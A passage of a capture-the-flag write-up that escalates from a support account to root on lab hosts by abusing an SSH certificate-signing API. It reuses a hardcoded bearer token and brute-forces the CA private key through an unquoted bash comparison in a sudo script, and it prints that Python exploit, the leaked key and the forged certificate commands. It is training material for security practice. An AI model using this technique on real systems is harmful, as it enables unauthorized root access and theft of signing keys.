ssh-ed25519-cert-v01@openssh.com AAAAIHNzaC1lZDI1NTE5LWNlcnQtdjAxQG9wZW5zc2guY29tAAAAIKqvApq1a54dGjbpJS5VaAQzQ+Le83fv7gwX86DR2iReAAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3dAAAAAAAAAN8AAAABAAAABDB4ZGYAAAAIAAAABHJvb3QAAAAAZdJg5P//////////AAAAAAAAAIIAAAAVcGVybWl0LVgxMS1mb3J3YXJkaW5nAAAAAAAAABdwZXJtaXQtYWdlbnQtZm9yd2FyZGluZwAAAAAAAAAWcGVybWl0LXBvcnQtZm9yd2FyZGluZwAAAAAAAAAKcGVybWl0LXB0eQAAAAAAAAAOcGVybWl0LXVzZXItcmMAAAAAAAAAAAAAAZcAAAAHc3NoLXJzYQAAAAMBAAEAAAGBAOgEPVSgV8vjWD8VVffvet2blY/P5JnRta3k9g/52GiTi9vdSkk8gY54CxeYCTMRVgEciIT5oZutxe8NpJtlzpwjZpl8WtoQ+3TzQpUocAsA+Bo6f/MV2V3w/3JoQ0oEqW1Ytn0jqvCD3wgYROgHsk1kX2HNqyOMPQgMq/wlDc3CKYNxlNzot7SEnDnYA1wuzO16WIVLKhO3L03+hSBNSOQWyCyugSH46fPhu5UPZvGhn72Y4Nx1hNDgKHBqd/MVKdOtO0BCsm3If9sNFNrYGmZ2Zh1C77gdxsOXk1uITC7UU2yTP9g0M+SrdsRgQ6+AyK7/RkzLTB6tzHpOfQbZymlLvT+sbkYxwmLRZNxSJzeT5cnX3VYQbUS1ck1tl20lzsrLQQqFq3R2ByTzOmrraR6O2QFB3zqnoW9Hz7Eff8kzEe8w1VhU4Mm38wiKT32xZvlDs0JVwhdDR6NVPNMj1BPbuSb8VSCXdyzkJngYg3umiU96dBcSZ2ZsE5YPaGuUuwAAAZQAAAAMcnNhLXNoYTItNTEyAAABgBktNKBLZ8uo6Pb+1Rw9rKuUgbdVkE3HvIQe8k6VPjl59cAIGj0cfyDDtUBTyIbMCDOLVuAu/P0bKioN+WdQI/Wh6Lyisnb4n8KbIGFopNEKuhxenFFYJo3rV3wqZ62qQJxUIcGkEIWqxlaozW51yNcIGZ6XNwweqkXG4wau+wYyMsQAnFLgJG0iLBA6v/G6cuwzEJQY95RjcH2UgSahlWC5Po7a1TAARu+eC88vVsVvZINVU9OLiUnTGPbkwt7ftFjLYZVLyrTEsIxmYkj7cig4jN+EAZgXMT8j+AlVX+ZswTrUpbuEdFisz+1QgOYxJz+PouT3qVHi3z2I1t6lAaPGR+LoNcS7xJ0MEuV90I1qLha0dPyDBxg2CIlDfmL0GmjjIRlO4/LSgWilAHFDPgtydxBlZsmfKOIF9VgPlgOA/FJrTIOTaN5FidlYy+4i/cgrQDHwWSxoViIQ1MGQOCiVQdcgRNjQCQB6d8nDehwEw5McR9w3CrhkRqdRtgAigQ== nobody@nothing

```

#### Connect

That signed key allows me to connect as root:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@itrc.ssg.htb
Linux itrc 5.15.0-94-generic #104-Ubuntu SMP Tue Jan 9 15:25:40 UTC 2024 x86_64
...[snip]...
root@itrc:~# 

```

`user.txt` is in zzinter’s home directory:

```

root@itrc:/home/zzinter# cat user.txt
cdbc7870************************

```

## Shell as support on IT (host)

### Enumeration

In zzinter’s home directory there’s a bash script that interacts with the IT API to handle certificate signing:

```

root@itrc:/home/zzinter# ls
sign_key_api.sh   user.txt

```

The script has a usage that makes clear how it works:

```

root@itrc:/home/zzinter# ./sign_key_api.sh 
Usage: ./sign_key_api.sh <public_key_file> <username> <principal>

```

The script shows how this works:

```

#!/bin/bash

usage () {
    echo "Usage: $0 <public_key_file> <username> <principal>"
    exit 1
}

if [ "$#" -ne 3 ]; then
    usage
fi

public_key_file="$1"
username="$2"
principal_str="$3"

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

public_key=$(cat $public_key_file)

curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"

```

Most of this is input validation. It takes a public key file (that must exist), a username, and a principal. The principal must be one of four options. `support` is interesting because it references the IT server. It says the user with that principle is the support user.

Then it makes a `curl` request to `signserv.ssg.htb` including an auth token.

### Signserv

I can hit this API from my box after updating my `/etc/hosts`:

```

oxdf@hacky$ curl signserv.ssg.htb
{"detail":"Not Found"}

```

It needs that endpoint, and to be a POST request with the right auth token and arguments:

```

oxdf@hacky$ curl signserv.ssg.htb/v1/sign
{"detail":"Method Not Allowed"}
oxdf@hacky$ curl signserv.ssg.htb/v1/sign -X POST
{"detail":"Invalid authorization"}
oxdf@hacky$ curl signserv.ssg.htb/v1/sign -X POST -H "Authorization: Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
{"detail":[{"type":"missing","loc":["body"],"msg":"Field required","input":null,"url":"https://errors.pydantic.dev/2.6/v/missing"}]}

```

I know the arguments needed from the script - `public_key`, `username`, `principals`.

I’ll generate a key for use here:

```

oxdf@hacky$ ssh-keygen -t ed25519 -f resource_key
Generating public/private ed25519 key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in resource_key
Your public key has been saved in resource_key.pub
The key fingerprint is:
SHA256:GFFYJPtY4UPX6Igc8skRrqznwobvK6UKoxB1VFH3zSE oxdf@hacky
The key's randomart image is:
+--[ED25519 256]--+
|    ..*OB ooE .  |
|   ...+* +...+ . |
|  . .=+=+o  . o  |
| . o .**...      |
|.   o o S        |
| ...             |
|+=. .            |
|B.+o             |
|+=+o.            |
+----[SHA256]-----+
oxdf@hacky$ cat resource_key.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBsQYYm4bOJAXfQEywqmLp+N20c+fgMSWSHWy8mebIgp oxdf@hacky

```

Once I get the right args, with the newly generated public key, I can get a key signed as support:

```

oxdf@hacky$ curl signserv.ssg.htb/v1/sign -d '{"pubkey": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBsQYYm4bOJAXfQEywqmLp+N20c+fgMSWSHWy8mebIgp oxdf@hacky", "username": "0xdf", "principals": "support"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE" -s | tee resource_key-cert.pub
ssh-ed25519-cert-v01@openssh.com AAAAIHNzaC1lZDI1NTE5LWNlcnQtdjAxQG9wZW5zc2guY29tAAAAIHLp8YsauBHxwtGDTqMskfaTqsbbxcc20ul4crCJeH5aAAAAIBsQYYm4bOJAXfQEywqmLp+N20c+fgMSWSHWy8mebIgpAAAAAAAAACgAAAABAAAABDB4ZGYAAAALAAAAB3N1cHBvcnQAAAAAZzVWff//////////AAAAAAAAAIIAAAAVcGVybWl0LVgxMS1mb3J3YXJkaW5nAAAAAAAAABdwZXJtaXQtYWdlbnQtZm9yd2FyZGluZwAAAAAAAAAWcGVybWl0LXBvcnQtZm9yd2FyZGluZwAAAAAAAAAKcGVybWl0LXB0eQAAAAAAAAAOcGVybWl0LXVzZXItcmMAAAAAAAAAAAAAADMAAAALc3NoLWVkMjU1MTkAAAAggeDwK53LVKHJh+rMLcA2WABxbtDgyhm57MATyY0VKbEAAABTAAAAC3NzaC1lZDI1NTE5AAAAQBtLcBNJLkdM1IQNrJUVMhBrBcfgxFEtPjvj9rH3HugT8lYYxaH4LLETc9CWFmFpfc3XnSW7Ao3XVlILeVLYmQM= oxdf@hacky

```

That key works on the support user on the host server on TCP 2222:

```

oxdf@hacky$ ssh -i ./resource_key support@ssg.htb -p 2222
...[snip]...
support@ssg:~$ 

```

## Shell as zzinter

### Enumeration

#### Users

The support home directory is very empty:

```

support@ssg:~$ ls -al
total 28
drwxr-x--- 4 support support 4096 Jun 21 18:11 .
drwxr-xr-x 4 root    root    4096 Jul 23 13:44 ..
lrwxrwxrwx 1 root    root       9 Jun 21 18:11 .bash_history -> /dev/null
-rw-r--r-- 1 support support  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 support support 3771 Jan  6  2022 .bashrc
drwx------ 2 support support 4096 Feb  7  2024 .cache
-rw-r--r-- 1 support support  807 Jan  6  2022 .profile
drwx------ 2 support support 4096 Feb  7  2024 .ssh

```

zzinter also has an account on this host:

```

support@ssg:/home$ ls
support  zzinter

```

This makes sense, as in the tickets zzinter said he had temp access to this server while the API was under development. The support user can’t access it.

#### SSH Key Enumeration

Looking at the config for SSH on the host, there’s another `sshcerts.conf` file in `/etc/ssh/sshd_config.d`:

```

support@ssg:/etc/ssh$ ls sshd_config.d/
50-cloud-init.conf  sshcerts.conf
support@ssg:/etc/ssh$ cat sshd_config.d/sshcerts.conf 
HostKey /etc/ssh/ssh_host_dsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_ed25519_key
HostCertificate /etc/ssh/ssh_host_dsa_key-cert.pub
HostCertificate /etc/ssh/ssh_host_ecdsa_key-cert.pub
HostCertificate /etc/ssh/ssh_host_rsa_key-cert.pub
HostCertificate /etc/ssh/ssh_host_ed25519_key-cert.pub
TrustedUserCAKeys /etc/ssh/ca-it.pub
AuthorizedPrincipalsFile /etc/ssh/auth_principals/%u
PasswordAuthentication no

```

It blocks password auth, and it defines “Authorized Principals Files” to be in `/etc/ssh/auth_principals`. There are three:

```

support@ssg:/etc/ssh$ ls auth_principals/
root  support  zzinter

```

When a user tries to auth over SSH, it looks for a file with that username in this directory, and checks the principal of the certificate to see if it’s in this file. So a certificate signed with the `root_user` or `support` principal can log in as support:

```

support@ssg:/etc/ssh$ cat auth_principals/support 
support
root_user

```

`root_user` can log in as root, and `zzinter_temp` can log in as zzinter:

```

support@ssg:/etc/ssh$ cat auth_principals/root 
root_user
support@ssg:/etc/ssh$ cat auth_principals/zzinter 
zzinter_temp

```

It seems the IT staff haven’t removed zzinter’s access yet, despite what he said in the ticket.

### Sign Key

If I try to ask for a key signed by root\_user principal, it fails:

```

oxdf@hacky$ curl signserv.ssg.htb/v1/sign -d '{"pubkey": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBsQYYm4bOJAXfQEywqmLp+N20c+fgMSWSHWy8mebIgp oxdf@hacky", "username": "0xdf", "principals": "root_user,support,zzinter_temp"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE" -s | tee resource_key-cert.pub
{"detail":"Root access must be granted manually. See the IT admin staff."}

```

I’ll get a new certificate for my key signed with both the support and zzinter\_temp principals:

```

oxdf@hacky$ curl signserv.ssg.htb/v1/sign -d '{"pubkey": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBsQYYm4bOJAXfQEywqmLp+N20c+fgMSWSHWy8mebIgp oxdf@hacky", "username": "0xdf", "principals": "support,zzinter_temp"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE" -s | tee resource_key-cert.pub
ssh-ed25519-cert-v01@openssh.com AAAAIHNzaC1lZDI1NTE5LWNlcnQtdjAxQG9wZW5zc2guY29tAAAAIGZpJ7TO1NuBFyhJKTNEFSfQ66ncsuYsvv8lKZEUtzQkAAAAIBsQYYm4bOJAXfQEywqmLp+N20c+fgMSWSHWy8mebIgpAAAAAAAAACwAAAABAAAABDB4ZGYAAAAbAAAAB3N1cHBvcnQAAAAMenppbnRlcl90ZW1wAAAAAGc1WI3//////////wAAAAAAAACCAAAAFXBlcm1pdC1YMTEtZm9yd2FyZGluZwAAAAAAAAAXcGVybWl0LWFnZW50LWZvcndhcmRpbmcAAAAAAAAAFnBlcm1pdC1wb3J0LWZvcndhcmRpbmcAAAAAAAAACnBlcm1pdC1wdHkAAAAAAAAADnBlcm1pdC11c2VyLXJjAAAAAAAAAAAAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIIHg8Cudy1ShyYfqzC3ANlgAcW7Q4MoZuezAE8mNFSmxAAAAUwAAAAtzc2gtZWQyNTUxOQAAAEDQXNe7pGsWxNI7rYiUIsDHSo1mbmbqAHcFEEQQrnmY99HYvrcjrGJnrqtLr8VUNagSDSRgBbEAOWLf2YQwpEcH oxdf@hacky

```

That works to get onto the host as support and zzinter:

```

oxdf@hacky$ ssh -p 2222 -i ./resource_key support@itrc.ssg.htb 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-94-generic x86_64)
...[snip]...
support@ssg:~$ exit
logout
Connection to itrc.ssg.htb closed.
oxdf@hacky$ ssh -p 2222 -i ./resource_key zzinter@itrc.ssg.htb 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)
...[snip]...
zzinter@ssg:~$ 

```

## Shell as root

### Enumeration

zzinter can run `/opt/sign_key.sh` as root:

```

zzinter@ssg:~$ sudo -l
Matching Defaults entries for zzinter on ssg:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User zzinter may run the following commands on ssg:
    (root) NOPASSWD: /opt/sign_key.sh

```

This is the script he mentioned in the ticket that he was using, before the API from IT was in place.

It is very similar to the script he has on ITRC, but rather than using `curl` to hit the API, it signs locally:

```

#!/bin/bash

usage () {
    echo "Usage: $0 <ca_file> <public_key_file> <username> <principal> <serial>"
    exit 1
}

if [ "$#" -ne 5 ]; then
    usage
fi

ca_file="$1"
public_key_file="$2"
username="$3"
principal="$4"
serial="$5"

if [ ! -f "$ca_file" ]; then
    echo "Error: CA file '$ca_file' not found."
    usage
fi

if [[ $ca == "/etc/ssh/ca-it" ]]; then
    echo "Error: Use API for signing with this CA."
    usage
fi

itca=$(cat /etc/ssh/ca-it)
ca=$(cat "$ca_file")
if [[ $itca == $ca ]]; then
    echo "Error: Use API for signing with this CA."
    usage
fi

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers"
        echo "    analytics - analytics team databases"
        echo "    support - IT support server"
        echo "    security - SOC and ITRC servers"
        echo
        usage
    fi
done

if ! [[ $serial =~ "^[0-9]+$" ]]; then
    echo "Error: '$serial' is not a number."
    usage
fi

ssh-keygen -s "$ca_file" -z "$serial" -I "$username" -V -1w:forever -n "$principals" "$public_key_name"

```

It does have a check to make sure that the script isn’t used with the `ca-it` CA, as people should be using the API for this.

### Quoteless Bash Compare

#### Background

The check for the `ca-it` file reads the file, and then does a comparison with the given CA file, but it’s done without quotes! This is a vulnerability in Bash, as if there are wildcards in the second item, they will allow. [This post](https://mywiki.wooledge.org/BashPitfalls#A.5B_.24foo_.3D_.22bar.22_.5D) goes into more detail, and I showed exploiting this as a check bypass in [Codify](/2024/04/06/htb-codify.html#shell-as-root) and to read the variable in [Hackvent 2023 Day 8](/hackvent2023/medium#hv2308).

#### Exploit

This allows me to brute force the full `ca-it` file with a short python script:

```

import subprocess
import string

leaked_key = ""

while True:
    for c in "-" + string.ascii_letters + string.digits + "/+\n =":
        with open('/dev/shm/file', 'w') as f:
            f.write(leaked_key + c + "*")
        result = subprocess.run(["sudo", "/opt/sign_key.sh", "/dev/shm/file", "/etc/passwd", "0xdf", "0xdf", "1"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if "Error: Use API for signing with this CA." in result.stdout.decode():
            leaked_key += c
            print(c, end="", flush=True)
            break
    else:
        break

print()

```

It will loop forever until it breaks, and in that loop, it’ll loop over characters. For each one, it will write the leaked key so far plus the potential character plus a wildcard to a file. Then it calls `sign_key.sh` on that file, which will do the compare. If the contents up to the “\*” are right, it will hit the error for trying to use the forbidden CA cert. I’ll add that character to the `leaked_key` and start the character loop again. Once it tries all characters and doesn’t find anything, it will break and exit.

```

zzinter@ssg:/dev/shm$ time python leak_key.py 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAKg7BlysOwZc
rAAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQ
AAAEBexnpzDJyYdz+91UG3dVfjT/scyWdzgaXlgx75RjYOo4Hg8Cudy1ShyYfqzC3ANlgA
cW7Q4MoZuezAE8mNFSmxAAAAIkdsb2JhbCBTU0cgU1NIIENlcnRmaWNpYXRlIGZyb20gSV
QBAgM=
-----END OPENSSH PRIVATE KEY-----

real    9m7.549s
user    1m1.340s
sys     1m51.382s

```

### Shell

I’ll save that key to a file, and use the same command as used previously to sign a key:

```

oxdf@hacky$ ssh-keygen -s ca_it -z 223 -I '0xdf' -V -5m:forever -n root_user ~/keys/ed25519_gen.pub
Signed user key /home/oxdf/keys/ed25519_gen-cert.pub: id "0xdf" serial 223 for root_user valid after 2024-11-17T07:00:44

```

This time I’m giving the key the principal `root_user`, which will allow me to log in as root on the main it host.

I’ll connect over SSH:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@ssg.htb -p 2222
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)
...[snip]...
root@ssg:~# 

```

And grab `root.txt`:

```

root@ssg:~# cat root.txt
e3f5af2f************************

```